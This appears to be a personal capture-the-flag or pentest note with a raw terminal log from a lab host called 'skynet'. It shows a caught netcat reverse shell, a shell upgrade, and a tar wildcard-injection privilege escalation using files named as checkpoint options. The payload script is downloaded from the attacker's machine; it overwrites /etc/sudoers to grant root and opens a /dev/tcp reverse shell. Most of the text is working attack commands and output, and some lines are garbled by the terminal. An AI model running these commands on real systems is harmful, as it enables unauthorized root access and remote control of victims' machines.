
new day, new note

let's use:

mksudo-www-data.sh:
`echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers`

`cd /var/www/html`
`wget 10.18.21.236:8000/shells/mksudo-www-data.sh -O ./mksudo.sh`
`touch ./--checkpoint=1`
`touch ./'--checkpoint-action=exec=bash mksudo.sh'`

does not work with sh but with bash


www-data
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443           
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.28.220] 53472
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:01:32 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ bash
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@skynet:/$ ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@skynet:/$ ^Z
zsh: suspended  nc -lvnp 443
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

www-data@skynet:/$ export TERM=xtrem
www-data@skynet:/$ ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@skynet:/$ ls -la
total 96
drwxr-xr-x  23 root root  4096 Sep 18  2019 .
drwxr-xr-x  23 root root  4096 Sep 18  2019 ..
drwxr-xr-x   2 root root  4096 Sep 17  2019 bin
drwxr-xr-x   3 root root  4096 Sep 17  2019 boot
drwxr-xr-x  17 root root  3640 Jun 17 04:20 dev
drwxr-xr-x 102 root root  4096 Nov 26  2020 etc
drwxr-xr-x   3 root root  4096 Sep 17  2019 home
lrwxrwxrwx   1 root root    32 Sep 17  2019 initrd.img -> boot/initrd.img-4.8.0-58-generic
lrwxrwxrwx   1 root root    33 Sep 17  2019 initrd.img.old -> boot/initrd.img-4.4.0-161-generic
drwxr-xr-x  22 root root  4096 Sep 17  2019 lib
drwxr-xr-x   2 root root  4096 Sep 17  2019 lib64
drwx------   2 root root 16384 Sep 17  2019 lost+found
drwxr-xr-x   3 root root  4096 Sep 17  2019 media
drwxr-xr-x   2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x   2 root root  4096 Feb 26  2019 opt
dr-xr-xr-x 137 root root     0 Jun 17 04:20 proc
drwx------   4 root root  4096 Sep 17  2019 root
drwxr-xr-x  26 root root   900 Jun 17 04:20 run
drwxr-xr-x   2 root root 12288 Sep 17  2019 sbin
drwxr-xr-x   2 root root  4096 Sep 17  2019 snap
drwxr-xr-x   3 root root  4096 Sep 17  2019 srv
dr-xr-xr-x  13 root root     0 Jun 17 04:20 sys
drwxrwxrwt   9 root root  4096 Jun 17 05:09 tmp
drwxr-xr-x  10 root root  4096 Sep 17  2019 usr
drwxr-xr-x  14 root root  4096 Sep 17  2019 var
lrwxrwxrwx   1 root root    29 Sep 17  2019 vmlinuz -> boot/vmlinuz-4.8.0-58-generic
lrwxrwxrwx   1 root root    30 Sep 17  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-161-generic
www-data@skynet:/$ export TERM=xterm
www-data@skynet:/$ ls -la /usr/local/sbin
total 8
drwxr-xr-x  2 root root 4096 Feb 26  2019 .
drwxr-xr-x 10 root root 4096 Sep 17  2019 ..
www-data@skynet:/$ ls -la /usr/local/bin
total 8
drwxr-xr-x  2 root root 4096 Feb 26  2019 .
drwxr-xr-x 10 root root 4096 Sep 17  2019 ..
www-data@skynet:/$ ls -la /sbin
total 13288
drwxr-xr-x  2 root root     12288 Sep 17  2019 .
drwxr-xr-x 23 root root      4096 Sep 18  2019 ..
-rwxr-xr-x  1 root root     52466 Mar 27  2017 MAKEDEV
-rwxr-xr-x  1 root root       112 May  1  2014 acpi_available
-rwxr-xr-x  1 root root     44104 May 16  2018 agetty
-rwxr-xr-x  1 root root       125 May  1  2014 apm_available
-rwxr-xr-x  1 root root   1287064 May 28  2019 apparmor_parser
-rwxr-xr-x  1 root root     27224 Oct 30  2015 badblocks
-rwxr-xr-x  1 root root     23080 May 16  2018 blkdiscard
-rwxr-xr-x  1 root root     81296 May 16  2018 blkid
-rwxr-xr-x  1 root root     35624 May 16  2018 blockdev
-rwxr-xr-x  1 root root     64240 Nov  6  2018 bridge
-rwxr-xr-x  1 root root     19032 Oct 23  2015 capsh
-rwxr-xr-x  1 root root     86408 May 16  2018 cfdisk
-rwxr-xr-x  1 root root     23056 May 16  2018 chcpu
-rwxr-xr-x  1 root root     10552 Nov 18  2014 crda
-rwxr-xr-x  1 root root      1134 Sep  6  2017 cryptdisks_start
-rwxr-xr-x  1 root root      1191 Sep  6  2017 cryptdisks_stop
-rwxr-xr-x  1 root root     59320 Sep  6  2017 cryptsetup
-rwxr-xr-x  1 root root     41264 Sep  6  2017 cryptsetup-reencrypt
-rwxr-xr-x  1 root root     10592 May 16  2018 ctrlaltdel
-rwxr-xr-x  1 root root    150264 Oct 30  2015 debugfs
lrwxrwxrwx  1 root root         9 Sep 17  2019 depmod -> /bin/kmod
-rwxr-xr-x  1 root root    487248 Mar  5  2018 dhclient
-rwxr-xr-x  1 root root     15649 Mar  5  2018 dhclient-script
-rwxr-xr-x  1 root root     43080 Apr 16  2016 dmeventd
-rwxr-xr-x  1 root root    149520 Apr 16  2016 dmsetup
lrwxrwxrwx  1 root root         8 May 26  2016 dosfsck -> fsck.fat
lrwxrwxrwx  1 root root         8 May 26  2016 dosfslabel -> fatlabel
-rwxr-xr-x  1 root root     23136 Oct 30  2015 dumpe2fs
-rwxr-xr-x  1 root root    256952 Oct 30  2015 e2fsck
-rwxr-xr-x  1 root root     31488 Oct 30  2015 e2image
lrwxrwxrwx  1 root root         7 Sep 17  2019 e2label -> tune2fs
-rwxr-xr-x  1 root root     10656 Oct 30  2015 e2undo
-rwxr-xr-x  1 root root    273784 Apr  1  2016 ethtool
-rwxr-xr-x  1 root root     55376 May 26  2016 fatlabel
-rwxr-xr-x  1 root root    109632 May 16  2018 fdisk
-rwxr-xr-x  1 root root     10576 May 16  2018 findfs
-rwxr-xr-x  1 root root     14410 Apr 16  2016 fsadm
-rwxr-xr-x  1 root root     44184 May 16  2018 fsck
-rwxr-xr-x  1 root root     35608 May 16  2018 fsck.cramfs
lrwxrwxrwx  1 root root         6 Sep 17  2019 fsck.ext2 -> e2fsck
lrwxrwxrwx  1 root root         6 Sep 17  2019 fsck.ext3 -> e2fsck
lrwxrwxrwx  1 root root         6 Sep 17  2019 fsck.ext4 -> e2fsck
lrwxrwxrwx  1 root root         6 Sep 17  2019 fsck.ext4dev -> e2fsck
-rwxr-xr-x  1 root root     59472 May 26  2016 fsck.fat
-rwxr-xr-x  1 root root     76896 May 16  2018 fsck.minix
lrwxrwxrwx  1 root root         8 May 26  2016 fsck.msdos -> fsck.fat
-rwxr-xr-x  1 root root       333 Feb  5  2016 fsck.nfs
lrwxrwxrwx  1 root root         8 May 26  2016 fsck.vfat -> fsck.fat
-rwxr-xr-x  1 root root       433 Sep  8  2017 fsck.xfs
-rwxr-xr-x  1 root root     10616 May 16  2018 fsfreeze
-rwxr-xr-x  1 root root      6360 Feb  5  2016 fstab-decode
-rwxr-xr-x  1 root root     39904 May 16  2018 fstrim
-rwxr-xr-x  1 root root     10520 Oct 23  2015 getcap
-rwxr-xr-x  1 root root     10488 Oct 23  2015 getpcaps
lrwxrwxrwx  1 root root         6 Sep 17  2019 getty -> agetty
lrwxrwxrwx  1 root root        14 Apr  3  2019 halt -> /bin/systemctl
-rwxr-xr-x  1 root root    122808 Mar 22  2018 hdparm
-rwxr-xr-x  1 root root     56232 May 16  2018 hwclock
-rwxr-xr-x  1 root root     68040 Jun 30  2014 ifconfig
lrwxrwxrwx  1 root root         4 Sep 17  2019 ifdown -> ifup
-rwxr-xr-x  1 root root      3522 Jul 24  2015 ifenslave
lrwxrwxrwx  1 root root         9 Jul 24  2015 ifenslave-2.6 -> ifenslave
lrwxrwxrwx  1 root root         4 Sep 17  2019 ifquery -> ifup
-rwxr-xr-x  1 root root     67536 May 10  2018 ifup
lrwxrwxrwx  1 root root        20 Apr  3  2019 init -> /lib/systemd/systemd
lrwxrwxrwx  1 root root         9 Sep 17  2019 insmod -> /bin/kmod
-rwxr-xr-x  1 root root      2638 Jan 26  2016 installkernel
lrwxrwxrwx  1 root root         7 Sep 17  2019 ip -> /bin/ip
lrwxrwxrwx  1 root root        13 Feb 19  2016 ip6tables -> xtables-multi
lrwxrwxrwx  1 root root        13 Feb 19  2016 ip6tables-restore -> xtables-multi
lrwxrwxrwx  1 root root        13 Feb 19  2016 ip6tables-save -> xtables-multi
-rwxr-xr-x  1 root root     18760 Jun 30  2014 ipmaddr
lrwxrwxrwx  1 root root        13 Feb 19  2016 iptables -> xtables-multi
lrwxrwxrwx  1 root root        13 Feb 19  2016 iptables-restore -> xtables-multi
lrwxrwxrwx  1 root root        13 Feb 19  2016 iptables-save -> xtables-multi
-rwxr-xr-x  1 root root     22864 Jun 30  2014 iptunnel
-rwxr-xr-x  1 root root     14328 Dec 11  2018 iscsi-iname
-rwxr-xr-x  1 root root      5284 Sep 12  2013 iscsi_discovery
-rwxr-xr-x  1 root root    754952 Dec 11  2018 iscsiadm
-rwxr-xr-x  1 root root    783984 Dec 11  2018 iscsid
-rwxr-xr-x  1 root root    329000 Dec 11  2018 iscsistart
-rwxr-xr-x  1 root root     23072 May 16  2018 isosize
-rwxr-xr-x  1 root root    177792 Oct 24  2014 iw
-rwxr-xr-x  1 root root     10616 Sep 22  2016 kbdrate
-rwxr-xr-x  1 root root     18504 Dec 10  2015 key.dns_resolver
-rwxr-xr-x  1 root root     19056 Feb  5  2016 killall5
-rwxr-xr-x  1 root root       387 Feb  5  2019 ldconfig
-rwxr-xr-x  1 root root   1000608 Feb  5  2019 ldconfig.real
-rwxr-xr-x  1 root root     10600 Oct 30  2015 logsave
-rwxr-xr-x  1 root root     72920 May 16  2018 losetup
lrwxrwxrwx  1 root root         9 Sep 17  2019 lsmod -> /bin/kmod
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvchange -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvconvert -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvcreate -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvdisplay -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvextend -> lvm
-rwxr-xr-x  1 root root   1521152 Apr 16  2016 lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvmchange -> lvm
-rwxr-xr-x  1 root root     12688 Apr 16  2016 lvmconf
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvmconfig -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvmdiskscan -> lvm
-rwxr-xr-x  1 root root      9538 Apr 16  2016 lvmdump
-rwxr-xr-x  1 root root     51336 Apr 16  2016 lvmetad
-rwxr-xr-x  1 root root     60952 Apr 16  2016 lvmpolld
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvmsadc -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvmsar -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvreduce -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvremove -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvrename -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvresize -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvs -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 lvscan -> lvm
-rwxr-xr-x  1 root root    513216 Nov  8  2017 mdadm
-rwxr-xr-x  1 root root    319280 Nov  8  2017 mdmon
-rwxr-xr-x  1 root root     19264 Jun 30  2014 mii-tool
lrwxrwxrwx  1 root root         8 May 26  2016 mkdosfs -> mkfs.fat
-rwxr-xr-x  1 root root    106392 Oct 30  2015 mke2fs
-rwxr-xr-x  1 root root     10592 May 16  2018 mkfs
-rwxr-xr-x  1 root root     27224 May 16  2018 mkfs.bfs
-rwxr-xr-x  1 root root     35456 May 16  2018 mkfs.cramfs
lrwxrwxrwx  1 root root         6 Sep 17  2019 mkfs.ext2 -> mke2fs
lrwxrwxrwx  1 root root         6 Sep 17  2019 mkfs.ext3 -> mke2fs
lrwxrwxrwx  1 root root         6 Sep 17  2019 mkfs.ext4 -> mke2fs
lrwxrwxrwx  1 root root         6 Sep 17  2019 mkfs.ext4dev -> mke2fs
-rwxr-xr-x  1 root root     27128 May 26  2016 mkfs.fat
-rwxr-xr-x  1 root root     76912 May 16  2018 mkfs.minix
lrwxrwxrwx  1 root root         8 May 26  2016 mkfs.msdos -> mkfs.fat
lrwxrwxrwx  1 root root         6 Mar 21  2019 mkfs.ntfs -> mkntfs
lrwxrwxrwx  1 root root         8 May 26  2016 mkfs.vfat -> mkfs.fat
-rwxr-xr-x  1 root root    364216 Sep  8  2017 mkfs.xfs
-rwxr-xr-x  1 root root     18848 Apr  9  2018 mkhomedir_helper
-rwxr-xr-x  1 root root     84080 Mar 21  2019 mkntfs
-rwxr-xr-x  1 root root     72944 May 16  2018 mkswap
lrwxrwxrwx  1 root root         9 Sep 17  2019 modinfo -> /bin/kmod
lrwxrwxrwx  1 root root         9 Sep 17  2019 modprobe -> /bin/kmod
-rwsr-xr-x  1 root root     35600 Mar  6  2017 mount.cifs
-rwxr-xr-x  1 root root     10232 Jul 12  2016 mount.fuse
lrwxrwxrwx  1 root root        15 Mar 21  2019 mount.lowntfs-3g -> /bin/lowntfs-3g
lrwxrwxrwx  1 root root        13 Mar 21  2019 mount.ntfs -> mount.ntfs-3g
lrwxrwxrwx  1 root root        12 Mar 21  2019 mount.ntfs-3g -> /bin/ntfs-3g
-rwxr-xr-x  1 root root     43832 May  8  2018 mount.vmhgfs
-rwxr-xr-x  1 root root     14816 Jun 30  2014 nameif
-rwxr-xr-x  1 root root     55408 Mar 21  2019 ntfsclone
-rwxr-xr-x  1 root root     34920 Mar 21  2019 ntfscp
-rwxr-xr-x  1 root root     26728 Mar 21  2019 ntfslabel
-rwxr-xr-x  1 root root     71792 Mar 21  2019 ntfsresize
-rwxr-xr-x  1 root root     51304 Mar 21  2019 ntfsundelete
-rwxr-xr-x  1 root root      2251 Dec  2  2009 on_ac_power
-rwxr-sr-x  1 root shadow   35632 Apr  9  2018 pam_extrausers_chkpwd
-rwxr-xr-x  1 root root     35568 Apr  9  2018 pam_extrausers_update
-rwxr-xr-x  1 root root     10600 Apr  9  2018 pam_tally
-rwxr-xr-x  1 root root     14784 Apr  9  2018 pam_tally2
-rwxr-xr-x  1 root root     80144 Jan 15  2018 parted
-rwxr-xr-x  1 root root     10312 Jan 15  2018 partprobe
-rwxr-xr-x  1 root root     10568 May 16  2018 pivot_root
-rwxr-xr-x  1 root root     10448 Jun 30  2014 plipconfig
-rwxr-xr-x  1 root root     85728 May  9  2018 plymouthd
lrwxrwxrwx  1 root root        14 Apr  3  2019 poweroff -> /bin/systemctl
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvchange -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvck -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvcreate -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvdisplay -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvmove -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvremove -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvresize -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvs -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 pvscan -> lvm
-rwxr-xr-x  1 root root     29800 Jun 30  2014 rarp
-rwxr-xr-x  1 root root     14712 May 16  2018 raw
lrwxrwxrwx  1 root root        14 Apr  3  2019 reboot -> /bin/systemctl
-rwxr-xr-x  1 root root      6280 Nov 18  2014 regdbdump
-rwxr-xr-x  1 root root     18424 Dec 10  2015 request-key
-rwxr-xr-x  1 root root     52336 Oct 30  2015 resize2fs
-rwxr-xr-x  1 root root      4590 Nov 29  2017 resolvconf
lrwxrwxrwx  1 root root         9 Sep 17  2019 rmmod -> /bin/kmod
-rwxr-xr-x  1 root root     58032 Jun 30  2014 route
-rwxr-xr-x  1 root root     37464 Nov  6  2018 rtacct
-rwxr-xr-x  1 root root     43608 Nov  6  2018 rtmon
lrwxrwxrwx  1 root root        14 Apr  3  2019 runlevel -> /bin/systemctl
-rwxr-xr-x  1 root root     31728 May 16  2018 runuser
-rwxr-xr-x  1 root root     10544 Oct 23  2015 setcap
-rwxr-xr-x  1 root root     10664 Sep 22  2016 setvtrgb
-rwxr-xr-x  1 root root     94280 May 16  2018 sfdisk
-rwxr-xr-x  1 root root       885 May 16  2017 shadowconfig
lrwxrwxrwx  1 root root        14 Apr  3  2019 shutdown -> /bin/systemctl
-rwxr-xr-x  1 root root     33928 Jun 30  2014 slattach
-rwxr-xr-x  1 root root     32528 Oct 17  2018 start-stop-daemon
-rwxr-xr-x  1 root root     44152 May 16  2018 sulogin
-rwxr-xr-x  1 root root     14776 May 16  2018 swaplabel
-rwxr-xr-x  1 root root     19024 May 16  2018 swapoff
-rwxr-xr-x  1 root root     44288 May 16  2018 swapon
-rwxr-xr-x  1 root root     14808 May 16  2018 switch_root
-rwxr-xr-x  1 root root     23048 May 14  2018 sysctl
-rwxr-xr-x  1 root root    333864 Nov  6  2018 tc
lrwxrwxrwx  1 root root        14 Apr  3  2019 telinit -> /bin/systemctl
-rwxr-xr-x  1 root root     43400 Nov  6  2018 tipc
-rwxr-xr-x  1 root root     77368 Oct 30  2015 tune2fs
lrwxrwxrwx  1 root root        12 Apr  3  2019 udevadm -> /bin/udevadm
-rwxr-sr-x  1 root shadow   35600 Apr  9  2018 unix_chkpwd
-rwxr-xr-x  1 root root     35536 Apr  9  2018 unix_update
-rwxr-xr-x  1 root root     35168 Feb 24  2015 ureadahead
-rwxr-xr-x  1 root root     10488 May 10  2018 vconfig
-rwxr-xr-x  1 root root     32672 Sep  6  2017 veritysetup
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgcfgbackup -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgcfgrestore -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgchange -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgck -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgconvert -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgcreate -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgdisplay -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgexport -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgextend -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgimport -> lvm
-rwxr-xr-x  1 root root      9625 Apr 16  2016 vgimportclone
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgmerge -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgmknodes -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgreduce -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgremove -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgrename -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgs -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgscan -> lvm
lrwxrwxrwx  1 root root         3 Apr 16  2016 vgsplit -> lvm
-rwxr-xr-x  1 root root     31464 May 16  2018 wipefs
-rwxr-xr-x  1 root root    544792 Sep  8  2017 xfs_repair
-rwxr-xr-x  1 root root     87832 Feb 19  2016 xtables-multi
-rwxr-xr-x  1 root root     77064 May 16  2018 zramctl
www-data@skynet:/$ ls -lad /sbin
drwxr-xr-x 2 root root 12288 Sep 17  2019 /sbin
www-data@skynet:/$ ls -lad /bin
drwxr-xr-x 2 root root 4096 Sep 17  2019 /bin
www-data@skynet:/$ ls -lad /usr/bin
drwxr-xr-x 2 root root 36864 Sep 17  2019 /usr/bin
www-data@skynet:/$ ls -lad /usr/sbin
drwxr-xr-x 2 root root 12288 Sep 17  2019 /usr/sbin
www-data@skynet:/$ cd /var/www/html
-O ./mksudo.sht:/var/www/html$ wget 10.18.21.236:8000/shells/mksudo-www-data.sh  
--2024-06-17 06:05:40--  http://10.18.21.236:8000/shells/mksudo-www-data.sh
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 112 [text/x-sh]
Saving to: './mksudo.sh'

./mksudo.sh         100%[===================>]     112  --.-KB/s    in 0s      

2024-06-17 06:05:40 (31.1 MB/s) - './mksudo.sh' saved [112/112]

www-data@skynet:/var/www/html$ touch ./--checkpoint=1
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 06:08 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data   112 Jun 17 05:58 mksudo.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ cat mksudo.sh 
#!/bin/bash

echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers

bash -i >& /dev/tcp/10.18.21.236/444 0>&1
www-data@skynet:/var/www/html$ touch ./'--checkpoint-action=exec=sh mksudo.sh'
-O ./mksudo.sht:/var/www/html$ wget 10.18.21.236:8000/shells/mksudo-www-data.sh -
--2024-06-17 06:19:40--  http://10.18.21.236:8000/shells/mksudo-www-data.sh
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 129 [text/x-sh]
Saving to: './mksudo.sh'

./mksudo.sh         100%[===================>]     129  --.-KB/s    in 0s      

2024-06-17 06:19:40 (33.9 MB/s) - './mksudo.sh' saved [129/129]

www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:09 --checkpoint-action=exec=sh mksudo.sh
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 06:09 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data   129 Jun 17 06:19 mksudo.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:09 --checkpoint-action=exec=sh mksudo.sh
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 06:09 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data   129 Jun 17 06:19 mksudo.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ sh mksudo.sh
touch: cannot touch './wasrun1': Permission denied
mksudo.sh: 5: mksudo.sh: cannot create /etc/sudoers: Permission denied
mksudo.sh: 8: mksudo.sh: Syntax error: Bad fd number
www-data@skynet:/var/www/html$ ls -lad /etc/sudoers
-r--r----- 1 root root 34 Jun 17 06:23 /etc/sudoers
www-data@skynet:/var/www/html$ bash mksudo.sh
touch: cannot touch './wasrun1': Permission denied
mksudo.sh: line 5: /etc/sudoers: Permission denied
www-data@skynet:/var/www/html$ rm --help
Usage: rm [OPTION]... [FILE]...
Remove (unlink) the FILE(s).

  -f, --force           ignore nonexistent files and arguments, never prompt
  -i                    prompt before every removal
  -I                    prompt once before removing more than three files, or
                          when removing recursively; less intrusive than -i,
                          while still giving protection against most mistakes
      --interactive[=WHEN]  prompt according to WHEN: never, once (-I), or
                          always (-i); without WHEN, prompt always
      --one-file-system  when removing a hierarchy recursively, skip any
                          directory that is on a file system different from
                          that of the corresponding command line argument
      --no-preserve-root  do not treat '/' specially
      --preserve-root   do not remove '/' (default)
  -r, -R, --recursive   remove directories and their contents recursively
  -d, --dir             remove empty directories
  -v, --verbose         explain what is being done
      --help     display this help and exit
      --version  output version information and exit

By default, rm does not remove directories.  Use the --recursive (-r or -R)
option to remove each listed directory, too, along with all of its contents.

To remove a file whose name starts with a '-', for example '-foo',
use one of these commands:
  rm -- -foo

  rm ./-foo

Note that if you use rm to remove a file, it might be possible to recover
some of its contents, given sufficient expertise and/or time.  For greater
assurance that the contents are truly unrecoverable, consider using shred.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Report rm translation bugs to <http://translationproject.org/team/>
Full documentation at: <http://www.gnu.org/software/coreutils/rm>
or available locally via: info '(coreutils) rm invocation'
www-data@skynet:/var/www/html$ rm -i *  
rm: unrecognized option '--checkpoint-action=exec=sh mksudo.sh'
Try 'rm ./'--checkpoint-action=exec=sh mksudo.sh'' to remove the file '--checkpoint-action=exec=sh mksudo.sh'.
Try 'rm --help' for more information.
www-data@skynet:/var/www/html$ rm -i ./*
rm: remove regular empty file './--checkpoint-action=exec=sh mksudo.sh'? y
rm: remove regular empty file './--checkpoint=1'? ^C
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 06:35 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data   129 Jun 17 06:19 mksudo.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css                      ww-data@skynet:/var/www/html$ touch ./'--checkpoint-action=exec=bawww/html$ touch ./'--checkpoint-action=exec=bash mksudo.sh' 

www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:38 --checkpoint-action=exec=bash mksudo.sh
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 06:38 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
www-data@skynet:/var/www/html$ rm -i ./*
rm: remove regular empty file './--checkpoint-action=exec=bash mksudo.sh'? y
www-data@skynet:/var/www/html$ touch ./'--checkpoint-action=exec=sh mksudo.sh
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:48 --checkpoint-action=exec=sh mksudo.sh
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 06:48 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
